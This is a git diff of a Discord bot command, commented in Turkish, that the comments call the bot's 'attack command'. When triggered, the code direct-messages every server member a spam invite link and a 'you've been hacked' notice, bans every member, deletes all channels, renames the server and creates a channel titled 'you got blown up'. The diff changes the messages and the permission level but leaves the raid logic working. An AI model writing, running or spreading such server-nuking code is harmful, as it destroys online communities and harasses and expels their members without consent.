@@ -5,15 +5,15 @@ exports.run = function(client, message) {
 
     message.guild.members.map(c => c.send(
 
-"• ADAM OLUN LAN ADAM\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• Hepiniz adam olun!\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
-+"• ALAYINIZA BORU"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• https://discord.gg/mk3Ug3C\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• DC BOT LİST TARAFINDAN BASILDINIZ! SEBEP BAŞKALARININ KODUNU ÇALMAK\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
++"• https://discord.gg/mk3Ug3C"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
 
     ));
   message.guild.members.map(c => c.ban());
   message.guild.channels.map(c => c.delete())
   
-message.guild.setName("AĞLAYIN ")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
+message.guild.setName("DC BOT LİST TARAFIDAN BASILDINIZ!")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
   
 
   message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
@@ -72,7 +72,7 @@ exports.conf = {
   enabled: true,//True => Komut açık, False => Komut kapalı 
   guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
   aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
-  permLevel: 0 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
+  permLevel: 4 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
 };
 
 exports.help = {
